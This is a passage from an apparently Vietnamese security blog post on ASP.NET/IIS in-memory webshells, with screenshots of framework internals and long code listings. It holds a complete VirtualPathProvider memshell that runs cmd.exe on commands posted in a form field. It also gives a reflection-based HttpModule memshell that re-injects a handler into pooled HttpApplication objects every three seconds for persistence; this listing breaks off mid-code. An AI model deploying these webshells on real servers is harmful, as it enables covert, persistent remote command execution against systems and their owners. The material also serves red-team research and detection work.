+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>public class TestPathProvider : VirtualPathProvider{
+</span></span><span class=line><span class=cl>    public override string GetCacheKey(string virtualPath){
+</span></span><span class=line><span class=cl>        Console.WriteLine(&#34;GetCacheKey called!!!&#34;);
+</span></span><span class=line><span class=cl>        return Previous.GetCacheKey(virtualPath);
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    public override bool FileExists(string virtualPath){
+</span></span><span class=line><span class=cl>        Console.WriteLine(&#34;FileExists called!!!&#34;);
+</span></span><span class=line><span class=cl>        return Previous.FileExists(virtualPath);
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p>GetCacheKey được gọi trước, hiểu vì sao nó được dùng rồi ha 😊<br><img src=https://hackmd.io/_uploads/Skb3XpoHZg.png loading=lazy alt=image><br>Mình craft lại thành code gen VirtualPath memshell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;script runat=&#34;server&#34;&gt;
+</span></span><span class=line><span class=cl>    public class TestPathProvider : VirtualPathProvider{
+</span></span><span class=line><span class=cl>        public override string GetCacheKey(string virtualPath){
+</span></span><span class=line><span class=cl>            HttpContext context = HttpContext.Current;
+</span></span><span class=line><span class=cl>            String cmd = context.Request.Form[&#34;command&#34;];
+</span></span><span class=line><span class=cl>            if (cmd != null){
+</span></span><span class=line><span class=cl>                HttpResponse response = context.Response;
+</span></span><span class=line><span class=cl>                Process p = new Process();
+</span></span><span class=line><span class=cl>                p.StartInfo.FileName = &#34;cmd.exe&#34;;
+</span></span><span class=line><span class=cl>                p.StartInfo.Arguments = &#34;/c&#34; + cmd;
+</span></span><span class=line><span class=cl>                p.Start();
+</span></span><span class=line><span class=cl>                byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());                     
+</span></span><span class=line><span class=cl>                response.Write(System.Text.Encoding.Default.GetString(data));
+</span></span><span class=line><span class=cl>                response.End();
+</span></span><span class=line><span class=cl>            }
+</span></span><span class=line><span class=cl>            return Previous.GetCacheKey(virtualPath);
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>&lt;/script&gt;
+</span></span><span class=line><span class=cl>&lt;%
+</span></span><span class=line><span class=cl>    TestPathProvider testProvider = new TestPathProvider();
+</span></span><span class=line><span class=cl>    HostingEnvironment.RegisterVirtualPathProvider(testProvider);
+</span></span><span class=line><span class=cl>    testProvider.InitializeLifetimeService();
+</span></span><span class=line><span class=cl>    Response.Write(&#34;VirtualPath Memory Webshell injected!!!&#34;);
+</span></span><span class=line><span class=cl>    Response.End();
+</span></span><span class=line><span class=cl>%&gt;
+</span></span></code></pre></td></tr></table></div></div><p>Now we got the real memshell here:<br><img src=https://hackmd.io/_uploads/rkFcVairWl.png loading=lazy alt=image><br></p><h2 id=httpmodule-memory-webshell>HTTPModule Memory Webshell</h2><p>Đến với kỹ thuật gần đây và phức tạp nhất, được team researcher của VCS công bố tại buổi SecTalk vào tháng 5 năm 2025 khi tiến hành RedTeam vào hệ thống có sử dụng Microsoft Exchange.<br>Ý tưởng của kỹ thuật này đã được đề cập trong paper của CrowdStrike về framework <a class=link href=https://www.crowdstrike.com/wp-content/uploads/2022/05/crowdstrike-iceapple-a-novel-internet-information-services-post-exploitation-framework-1.pdf target=_blank rel=noopener>IceApple</a> tại module 18, với mục đích thêm một EventHandler vào trong các HttpApplication đang được sử dụng bởi server:<br><img src=https://hackmd.io/_uploads/r1yOHToB-e.png loading=lazy alt=image><br></p><h3 id=httpapplication-reuse-mechanism>HttpApplication Reuse Mechanism</h3><p>Tại phần request life cycle, mình đã nói về việc một HttpApplication instance được khởi tạo, ở đây mình sẽ giải thích chi tiết hơn việc nó được khởi tạo như thế nào:<br>Khi HTTP request đến server, những hàm tiền xử lý được gọi để khởi tạo HttpContext và các thông tin cần thiết. Điều này được thực hiện thông qua 3 hàm ProcessRequestNotification trong callstack dưới đây:<br><img src=https://hackmd.io/_uploads/HJMiBpsHZx.png loading=lazy alt=image><br>Sau đó, HttpApplicationFactory tiến hành lấy ra 1 instance của HttpApplication để handle HttpContext, việc lựa chọn và lấy ra như thế nào nằm tại hàm GetNormalApplicationInstance:<br><img src=https://hackmd.io/_uploads/H1psHTiH-x.png loading=lazy alt=image><br>Tại hàm GetNormalApplicationInstance, HttpApllicationFactory sử dụng attribute <code>_freeList</code> chứa các object HttpApllication đã xử lý xong request và được tái chế để sử dụng lại. Nếu lấy được sẽ trả về object httpApplication đó:<br><img src=https://hackmd.io/_uploads/ByH0BTorbl.png loading=lazy alt=image><br>Từ đây rút ra được một số kết luận về HttpApplication như sau:</p><ul><li>Mỗi HttpApplication instance được dùng để xử lý 1 request, và không thể bị can thiệp cho đến khi xử lý xong</li><li>Nếu như số lượng request gửi đến nhiều hơn số lượng instance HttpApplication có trong <code>_freeList</code>, việc tạo mới để thực thi ngay hay sử dụng lại tùy thuộc vào cơ chế đồng bộ</li><li>Nếu như sử dụng .NET Framework lớn hơn 4.5 thì mặc định cơ chế này được bật.</li></ul><h3 id=logic-add-eventhandler-into-httpmodule>Logic Add EventHandler into HttpModule</h3><p>Tiếp tục từ hàm trước, lúc này HttpModule được khởi tạo thông qua hàm hàm Init, và call đến các event handler có trong module đó, đây cũng chính là những gì xảy ra trong HTTP Pipeline đã trình bày ở trên. Event AuthenticateRequest đứng ngay sau event đầu tiên BeginRequest - một event dùng để init thuộc tính nên có thể coi đây là event sớm nhất được gọi.<br>Khi được gọi, AuthenticateRequest ngay lập tức gọi phương thức add để thêm một object thuộc class EventHandler vào HttpModule:<br><img src=https://hackmd.io/_uploads/HJK1vTiHZl.png loading=lazy alt=image><br>Hàm AddSyncEventHookup này thực chất được thực hiện với tham số isPostNotification là false:<br><img src=https://hackmd.io/_uploads/SJleDajBWl.png loading=lazy alt=image><br>Một HttpApplication có nhiều HttpModule, lưu trong attribute ModuleContainers - 1 mảng các phần tử là instance của class PipelineModuleStepContainer.<br>Để thêm được Event vào đúng module, trước hết cần phải lấy module đó ra từ ModuleContainers thông qua hàm GetModuleContainer. EventHandler được ép thành SyncEventExecutionStep rồi mới thực hiện thêm event đó tại method AddEvent:<br><img src=https://hackmd.io/_uploads/Syb2DaoBWl.png loading=lazy alt=image><br>Hàm AddEvent chứa logic chính để thêm 1 event vào HttpModule:<br><img src=https://hackmd.io/_uploads/r1ITPToHWg.png loading=lazy alt=image><br></p><ul><li>Event được index tương ứng với tên để lấy ra giá trị số nguyên bằng EventToIndex. Ví dụ ở đây event AuthenticateRequest sẽ trả về giá trị là 1<br><img src=https://hackmd.io/_uploads/ry-W_aiSZg.png loading=lazy alt=image><br></li><li>IIS sẽ lấy ra danh sách các object HttpApplicationIExecutionStep trong mảng <code>_moduleSteps</code> tại ví trí thứ index của event đang xử lý</li><li>Nếu list lấy ra khác rỗng, tiến hành thêm event vào list trên</li></ul><h3 id=deploy-2>Deploy</h3><p>Dựa vào những gì đã tìm hiểu, HttpModule memshell cần bao gồm:</p><ul><li>Hàm Loop tiến hành inject tất cả các HttpApplication có trong <code>_freeList</code></li><li>Class chính sẽ gọi đến hàm Loop sau 1 thời gian nhất định, đảm bảo các instance HttpApplication mới được khởi tạo cũng sẽ bị inject</li><li>Hàm InjectHandler có nhiệm vụ lấy ra ModuleStep thông qua hàm GetModuleSteps, kiểm tra nếu kết quả trả về khác null tiến hành sử dụng hàm ClearInject để xóa EventHandler đã inject và thêm cái mới. Tránh trường hợp chỉ thêm khiến thực hiện câu lệnh lại nhiều lần.</li><li>Các class được sử dụng đa phần là private và internal nên cần sử dụng reflection khá nhiều</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span><span class=lnt>89
+</span><span class=lnt>90
+</span><span class=lnt>91
+</span><span class=lnt>92
+</span><span class=lnt>93
+</span><span class=lnt>94
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=p>&lt;</span><span class=n>script</span> <span class=n>runat</span><span class=p>=</span><span class=s>&#34;server&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=k>class</span> <span class=nc>ModuleMemShell</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=kd>private</span> <span class=kd>static</span> <span class=n>Assembly</span> <span class=n>sysWeb</span> <span class=p>=</span> <span class=k>typeof</span><span class=p>(</span><span class=n>HttpApplication</span><span class=p>).</span><span class=n>Assembly</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=kd>private</span> <span class=kd>static</span> <span class=n>Type</span> <span class=n>HAFClass</span> <span class=p>=</span> <span class=n>sysWeb</span><span class=p>.</span><span class=n>GetType</span><span class=p>(</span><span class=s>&#34;System.Web.HttpApplicationFactory&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=kd>private</span> <span class=kd>static</span> <span class=n>Type</span> <span class=n>PipelineModuleStepContainerClass</span> <span class=p>=</span> <span class=n>sysWeb</span><span class=p>.</span><span class=n>GetType</span><span class=p>(</span><span class=s>&#34;System.Web.PipelineModuleStepContainer&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=kd>private</span> <span class=kd>static</span> <span class=n>Type</span> <span class=n>HttpApplicationClass</span> <span class=p>=</span> <span class=n>sysWeb</span><span class=p>.</span><span class=n>GetType</span><span class=p>(</span><span class=s>&#34;System.Web.HttpApplication&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=kd>private</span> <span class=kd>static</span> <span class=n>Type</span> <span class=n>PipelineModuleStepContainerArrayClass</span> <span class=p>=</span> <span class=n>sysWeb</span><span class=p>.</span><span class=n>GetType</span><span class=p>(</span><span class=s>&#34;System.Web.PipelineModuleStepContainer[]&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=kd>private</span> <span class=kd>static</span> <span class=n>Type</span> <span class=n>SyncEventExecutionStepClass</span> <span class=p>=</span> <span class=n>sysWeb</span><span class=p>.</span><span class=n>GetType</span><span class=p>(</span><span class=s>&#34;System.Web.HttpApplication+SyncEventExecutionStep&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=kd>private</span> <span class=kd>static</span> <span class=n>Type</span> <span class=n>iExecutionStepType</span> <span class=p>=</span> <span class=n>sysWeb</span><span class=p>.</span><span class=n>GetType</span><span class=p>(</span><span class=s>&#34;System.Web.HttpApplication+IExecutionStep&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=kd>private</span> <span class=kd>static</span> <span class=n>Type</span> <span class=n>ListIExecutionStepClass</span> <span class=p>=</span> <span class=k>typeof</span><span class=p>(</span><span class=n>List</span><span class=p>&lt;&gt;).</span><span class=n>MakeGenericType</span><span class=p>(</span><span class=n>iExecutionStepType</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=kd>private</span> <span class=kd>static</span> <span class=n>Type</span> <span class=n>ListIExecutionStepArrayClass</span> <span class=p>=</span> <span class=n>ListIExecutionStepClass</span><span class=p>.</span><span class=n>MakeArrayType</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=kd>private</span> <span class=kd>static</span> <span class=n>BindingFlags</span> <span class=n>flag</span> <span class=p>=</span> <span class=n>BindingFlags</span><span class=p>.</span><span class=n>Instance</span> <span class=p>|</span> <span class=n>BindingFlags</span><span class=p>.</span><span class=n>NonPublic</span> <span class=p>|</span> <span class=n>BindingFlags</span><span class=p>.</span><span class=n>Public</span> <span class=p>|</span> <span class=n>BindingFlags</span><span class=p>.</span><span class=n>Static</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=kd>public</span> <span class=n>ModuleMemShell</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>                <span class=kt>var</span> <span class=n>previous_timer</span> <span class=p>=</span> <span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span><span class=p>.</span><span class=n>Application</span><span class=p>[</span><span class=s>&#34;loop&#34;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>previous_timer</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>                    <span class=p>((</span><span class=n>System</span><span class=p>.</span><span class=n>Threading</span><span class=p>.</span><span class=n>Timer</span><span class=p>)</span><span class=n>previous_timer</span><span class=p>).</span><span class=n>Dispose</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>                <span class=p>}</span>
+</span></span><span class=line><span class=cl>                <span class=kt>var</span> <span class=n>timer</span> <span class=p>=</span> <span class=k>new</span> <span class=n>System</span><span class=p>.</span><span class=n>Threading</span><span class=p>.</span><span class=n>Timer</span><span class=p>(</span><span class=n>Loop</span><span class=p>,</span> <span class=kc>null</span><span class=p>,</span> <span class=m>0</span><span class=p>,</span> <span class=m>3000</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>                <span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span><span class=p>.</span><span class=n>Application</span><span class=p>[</span><span class=s>&#34;loop&#34;</span><span class=p>]</span> <span class=p>=</span> <span class=n>timer</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                <span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span><span class=p>.</span><span class=n>Response</span><span class=p>.</span><span class=n>Write</span><span class=p>(</span><span class=s>&#34;HttpModule Memshell Injected!!!!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>void</span> <span class=n>Loop</span><span class=p>(</span><span class=n>Object</span> <span class=n>stateInfo</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=kt>var</span> <span class=n>appFactory</span> <span class=p>=</span> <span class=n>HAFClass</span><span class=p>.</span><span class=n>GetField</span><span class=p>(</span><span class=s>&#34;_theApplicationFactory&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>GetValue</span><span class=p>(</span><span class=kc>null</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=kt>var</span> <span class=n>_freeList</span> <span class=p>=</span> <span class=n>HAFClass</span><span class=p>.</span><span class=n>GetField</span><span class=p>(</span><span class=s>&#34;_freeList&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>GetValue</span><span class=p>(</span><span class=n>appFactory</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=k>foreach</span> <span class=p>(</span><span class=kt>var</span> <span class=n>httpApplication</span> <span class=k>in</span> <span class=p>(</span><span class=n>IEnumerable</span><span class=p>)</span><span class=n>_freeList</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>                <span class=n>InjectHandler</span><span class=p>((</span><span class=n>HttpApplication</span><span class=p>)</span><span class=n>httpApplication</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>void</span> <span class=n>InjectHandler</span><span class=p>(</span><span class=n>HttpApplication</span> <span class=n>httpApplication</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=kt>object</span> <span class=n>list</span> <span class=p>=</span> <span class=n>GetModuleSteps</span><span class=p>(</span><span class=n>httpApplication</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>list</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>                <span class=n>ClearInject</span><span class=p>(</span><span class=n>list</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>                <span class=n>InstallNew</span><span class=p>(</span><span class=n>list</span><span class=p>,</span> <span class=n>httpApplication</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=kt>object</span> <span class=n>GetModuleSteps</span><span class=p>(</span><span class=n>HttpApplication</span> <span class=n>httpApplication</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=k>foreach</span> <span class=p>(</span><span class=kt>var</span> <span class=n>notification</span> <span class=k>in</span> <span class=n>Enum</span><span class=p>.</span><span class=n>GetValues</span><span class=p>(</span><span class=k>typeof</span><span class=p>(</span><span class=n>RequestNotification</span><span class=p>))){</span>
+</span></span><span class=line><span class=cl>                <span class=kt>var</span> <span class=n>notification_index</span> <span class=p>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>PipelineModuleStepContainerClass</span><span class=p>.</span><span class=n>GetMethod</span><span class=p>(</span><span class=s>&#34;EventToIndex&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>Invoke</span><span class=p>(</span><span class=kc>null</span><span class=p>,</span> <span class=k>new</span> <span class=kt>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>notification</span> <span class=p>});</span>
+</span></span><span class=line><span class=cl>                <span class=kt>var</span> <span class=n>ModuleContainers</span> <span class=p>=</span> <span class=p>(</span><span class=n>HttpApplicationClass</span><span class=p>.</span><span class=n>GetProperty</span><span class=p>(</span><span class=s>&#34;ModuleContainers&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>GetValue</span><span class=p>(</span><span class=n>httpApplication</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>                <span class=kt>var</span> <span class=n>ModuleContainersLength</span> <span class=p>=</span> <span class=p>(</span><span class=n>Int32</span><span class=p>)</span><span class=n>PipelineModuleStepContainerArrayClass</span><span class=p>.</span><span class=n>GetProperty</span><span class=p>(</span><span class=s>&#34;Length&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>GetValue</span><span class=p>(</span><span class=n>ModuleContainers</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=p>=</span> <span class=m>0</span><span class=p>;</span> <span class=n>i</span> <span class=p>&lt;</span> <span class=n>ModuleContainersLength</span><span class=p>;</span> <span class=n>i</span><span class=p>++){</span>
+</span></span><span class=line><span class=cl>                    <span class=kt>var</span> <span class=n>moduleContainer</span> <span class=p>=</span> <span class=n>PipelineModuleStepContainerArrayClass</span><span class=p>.</span><span class=n>GetMethod</span><span class=p>(</span><span class=s>&#34;Get&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>Invoke</span><span class=p>(</span><span class=n>ModuleContainers</span><span class=p>,</span> <span class=k>new</span> <span class=kt>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>i</span> <span class=p>});</span>
+</span></span><span class=line><span class=cl>                    <span class=kt>var</span> <span class=n>_moduleSteps</span> <span class=p>=</span> <span class=n>PipelineModuleStepContainerClass</span><span class=p>.</span><span class=n>GetField</span><span class=p>(</span><span class=s>&#34;_moduleSteps&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>GetValue</span><span class=p>(</span><span class=n>moduleContainer</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=p>(</span><span class=n>_moduleSteps</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>                        <span class=kt>var</span> <span class=n>list</span> <span class=p>=</span> <span class=n>ListIExecutionStepArrayClass</span><span class=p>.</span><span class=n>GetMethod</span><span class=p>(</span><span class=s>&#34;Get&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>Invoke</span><span class=p>(</span><span class=n>_moduleSteps</span><span class=p>,</span> <span class=k>new</span> <span class=kt>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>notification_index</span> <span class=p>});</span>
+</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=p>(</span><span class=n>list</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>                            <span class=k>return</span> <span class=n>list</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                        <span class=p>}</span>
+</span></span><span class=line><span class=cl>                    <span class=p>}</span>
+</span></span><span class=line><span class=cl>                <span class=p>}</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>null</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>void</span> <span class=n>InstallNew</span><span class=p>(</span><span class=kt>object</span> <span class=n>list</span><span class=p>,</span> <span class=n>HttpApplication</span> <span class=n>httpApplication</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=kt>var</span> <span class=n>syncEventExecutionStep</span> <span class=p>=</span> <span class=n>SyncEventExecutionStepClass</span><span class=p>.</span><span class=n>GetConstructor</span><span class=p>(</span><span class=n>flag</span><span class=p>,</span> <span class=kc>null</span><span class=p>,</span> <span class=k>new</span> <span class=n>Type</span><span class=p>[]</span> <span class=p>{</span> <span class=k>typeof</span><span class=p>(</span><span class=n>HttpApplication</span><span class=p>),</span> <span class=k>typeof</span><span class=p>(</span><span class=n>EventHandler</span><span class=p>)</span> <span class=p>},</span> <span class=kc>null</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=p>.</span><span class=n>Invoke</span><span class=p>(</span><span class=k>new</span> <span class=kt>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>httpApplication</span><span class=p>,</span> <span class=p>(</span><span class=n>EventHandler</span><span class=p>)</span><span class=n>CustomHandler</span> <span class=p>});</span>
+</span></span><span class=line><span class=cl>            <span class=n>ListIExecutionStepClass</span><span class=p>.</span><span class=n>GetMethod</span><span class=p>(</span><span class=s>&#34;Add&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>Invoke</span><span class=p>(</span><span class=n>list</span><span class=p>,</span> <span class=k>new</span> <span class=kt>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>syncEventExecutionStep</span> <span class=p>});</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>void</span> <span class=n>ClearInject</span><span class=p>(</span><span class=kt>object</span> <span class=n>list</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=kt>var</span> <span class=n>list_count</span> <span class=p>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>ListIExecutionStepClass</span><span class=p>.</span><span class=n>GetProperty</span><span class=p>(</span><span class=s>&#34;Count&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>GetValue</span><span class=p>(</span><span class=n>list</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=p>=</span> <span class=m>0</span><span class=p>;</span> <span class=n>i</span> <span class=p>&lt;</span> <span class=n>list_count</span><span class=p>;</span> <span class=n>i</span><span class=p>++){</span>
+</span></span><span class=line><span class=cl>                <span class=kt>var</span> <span class=n>syncEventExecutionStep</span> <span class=p>=</span> <span class=n>ListIExecutionStepClass</span><span class=p>.</span><span class=n>GetMethod</span><span class=p>(</span><span class=s>&#34;get_Item&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>Invoke</span><span class=p>(</span><span class=n>list</span><span class=p>,</span> <span class=k>new</span> <span class=kt>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>i</span> <span class=p>});</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>syncEventExecutionStep</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>                    <span class=kt>var</span> <span class=n>handler</span> <span class=p>=</span> <span class=p>(</span><span class=n>Delegate</span><span class=p>)</span><span class=n>SyncEventExecutionStepClass</span><span class=p>.</span><span class=n>GetProperty</span><span class=p>(</span><span class=s>&#34;Handler&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>GetValue</span><span class=p>(</span><span class=n>syncEventExecutionStep</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>                    <span class=kt>var</span> <span class=n>handler_name</span> <span class=p>=</span> <span class=n>handler</span><span class=p>.</span><span class=n>Method</span><span class=p>.</span><span class=n>DeclaringType</span><span class=p>.</span><span class=n>FullName</span> <span class=p>+</span> <span class=s>&#34;.&#34;</span> <span class=p>+</span> <span class=n>handler</span><span class=p>.</span><span class=n>Method</span><span class=p>.</span><span class=n>Name</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=p>(</span><span class=n>handler_name</span> <span class=p>==</span> <span class=s>&#34;ASP.httpmodulememshell_aspx+ModuleMemShell.CustomHandler&#34;</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>                        <span class=n>ListIExecutionStepClass</span><span class=p>.</span><span class=n>GetMethod</span><span class=p>(</span><span class=s>&#34;RemoveAt&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>Invoke</span><span class=p>(</span><span class=n>list</span><span class=p>,</span> <span class=k>new</span> <span class=kt>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>i</span> <span class=p>});</span>
+</span></span><span class=line><span class=cl>                    <span class=p>}</span>
+</span></span><span class=line><span class=cl>                <span class=p>}</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=kd>public</span> <span class=k>void</span> <span class=n>CustomHandler</span><span class=p>(</span><span class=kt>object</span> <span class=n>sender</span><span class=p>,</span> <span class=n>EventArgs</span> <span class=n>e</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=n>HttpContext</span> <span class=n>context</span> <span class=p>=</span> <span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span><span class=p>;</span>
